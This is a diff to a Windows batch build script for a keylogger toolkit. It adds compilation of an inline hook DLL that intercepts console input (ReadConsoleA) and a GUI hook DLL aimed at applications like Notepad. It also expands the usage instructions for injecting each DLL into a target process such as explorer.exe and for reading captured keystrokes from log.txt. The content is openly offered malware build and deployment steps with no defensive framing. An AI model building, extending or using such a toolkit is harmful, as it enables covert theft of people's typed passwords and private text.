@@ -90,7 +90,7 @@ REM Define libraries
 set HOOK_LIBS=user32.lib kernel32.lib
 set INJECTOR_LIBS=user32.lib kernel32.lib
 
-echo [1/2] Compiling Keyboard Hook DLL...
+echo [1/4] Compiling Keyboard Hook DLL...
 echo Command: cl /LD /EHsc /Foobj\ /Fe%KEYLOGGER_DLL% keyboardhook.cpp %HOOK_LIBS%
 cl /LD /EHsc /Foobj\ /Fe%KEYLOGGER_DLL% keyboardhook.cpp %HOOK_LIBS%
 
@@ -102,7 +102,7 @@ IF %ERRORLEVEL% NEQ 0 (
 )
 
 echo.
-echo [2/2] Compiling DLL Injector...
+echo [2/4] Compiling DLL Injector...
 echo Command: cl /EHsc /Foobj\ /Fe%INJECTOR_EXE% injector.cpp %INJECTOR_LIBS%
 cl /EHsc /Foobj\ /Fe%INJECTOR_EXE% injector.cpp %INJECTOR_LIBS%
 
@@ -114,20 +114,53 @@ IF %ERRORLEVEL% NEQ 0 (
 )
 
 echo.
+echo [3/4] Compiling Inline Hook DLL (console)...
+echo Command: cl /LD /EHsc /Foobj\ /Fe%INLINE_HOOK_DLL% inlinehook.cpp %HOOK_LIBS%
+cl /LD /EHsc /Foobj\ /Fe%INLINE_HOOK_DLL% inlinehook.cpp %HOOK_LIBS%
+
+IF %ERRORLEVEL% NEQ 0 (
+    echo [ERROR] Inline Hook DLL compilation failed!
+    goto :error
+) ELSE (
+    echo [SUCCESS] %INLINE_HOOK_DLL% compiled successfully!
+)
+
+echo.
+echo [4/4] Compiling GUI Hook DLL (GUI applications)...
+echo Command: cl /LD /EHsc /Foobj\ /Fe%BUILD_DIR%\GUIhook.dll GUIhook.cpp %HOOK_LIBS%
+cl /LD /EHsc /Foobj\ /Fe%BUILD_DIR%\GUIhook.dll GUIhook.cpp %HOOK_LIBS%
+
+IF %ERRORLEVEL% NEQ 0 (
+    echo [ERROR] GUI Hook DLL compilation failed!
+    goto :error
+) ELSE (
+    echo [SUCCESS] GUIhook.dll compiled successfully!
+)
+
+echo.
 echo ========================================
 echo           BUILD SUCCESSFUL!
 echo ========================================
 echo.
 echo Generated files in %BUILD_DIR%\ directory:
-echo   - keylogger.dll       (Main keylogger DLL)
+echo   - keylogger.dll       (Main keylogger DLL - global hooks)
 echo   - injector.exe        (DLL injector tool)
+echo   - inlinehook.dll      (ReadConsoleA hook DLL - console apps)
+echo   - GUIhook.dll         (GUI application hook DLL - Notepad, etc.)
 echo.
 echo Usage Instructions:
 echo   1. Get target process PID: 
 echo      Get-Process explorer ^| Select-Object Id
 echo.
-echo   2. Inject keylogger into explorer.exe:
+echo   2. Choose injection method:
+echo      # Global keylogging (all applications):
 echo      %BUILD_DIR%\injector.exe [PID] "%CD%\%BUILD_DIR%\keylogger.dll"
+echo.
+echo      # Console-specific (CMD, PowerShell):
+echo      %BUILD_DIR%\injector.exe [console_PID] "%CD%\%BUILD_DIR%\inlinehook.dll"
+echo.
+echo      # GUI applications (Notepad, text editors):
+echo      %BUILD_DIR%\injector.exe [notepad_PID] "%CD%\%BUILD_DIR%\GUIhook.dll"
 echo.
 echo   3. Check logs in: log.txt
 echo.
